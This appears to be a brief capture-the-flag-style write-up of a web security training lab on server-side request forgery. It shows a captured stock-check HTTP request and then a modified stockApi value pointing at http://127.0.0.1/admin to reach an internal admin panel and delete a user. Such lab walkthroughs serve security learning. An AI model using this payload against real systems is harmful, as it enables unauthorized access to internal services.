task : vist http://localhost/admin and delete the user carlos.

![image](https://user-images.githubusercontent.com/67979878/128199883-ca00f9cd-f475-48ca-b7e1-3ab8f60898fc.png)

when choosing any product and check stack request is :

```
POST /product/stock HTTP/1.1
Host: acbe1f561f9eb743800f0e9e00e6008e.web-security-academy.net
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://acbe1f561f9eb743800f0e9e00e6008e.web-security-academy.net/product?productId=2
Content-Type: application/x-www-form-urlencoded
Origin: https://acbe1f561f9eb743800f0e9e00e6008e.web-security-academy.net
Content-Length: 107
Connection: close
Cookie: session=DIFO4Sb1IMaPRuQSCPL2PZ71ZUwbKEMU; session=uvAYcsCqazHR9tqN2HFGR1E0xvG7eTH4
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D2%26storeId%3D1
```

as we can see in stockapi it sends requst to another host to return stack querey .

let's modify it 
`stockApi=http://127.0.0.1/admin`

![image](https://user-images.githubusercontent.com/67979878/128200459-31b390cf-21fa-4b8c-86e6-a15aaa040e48.png)
